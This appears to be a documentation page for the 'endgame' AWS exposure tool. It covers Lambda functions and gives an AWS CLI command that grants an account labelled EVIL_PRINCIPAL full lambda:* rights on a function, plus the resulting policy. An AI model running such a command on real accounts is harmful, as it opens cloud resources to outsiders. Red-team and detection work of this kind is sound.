# Lambda Functions

Allows invoking the Lambda Function.

## Steps to Reproduce

* Using `endgame`:

* Using AWS CLI:

```bash
export EVIL_PRINCIPAL_ACCOUNT=999988887777
aws lambda add-permission \
    --function-name test-resource-exposure \
    --action lambda:* \
    --statement-id RbpExposer \
    --principal $EVIL_PRINCIPAL_ACCOUNT
```

## Example: Exposed Resource

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RbpExposer",
      "Effect": "Allow",
      "Principal": {
        "AWS": "999988887777"
      },
      "Action": [
        "lambda:*"
      ],
      "Resource": "arn:aws:lambda:us-east-1:111122223333:test-resource-exposure"
    }
  ]
}
```

## Remediation

## References

* [add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/add-permission.html)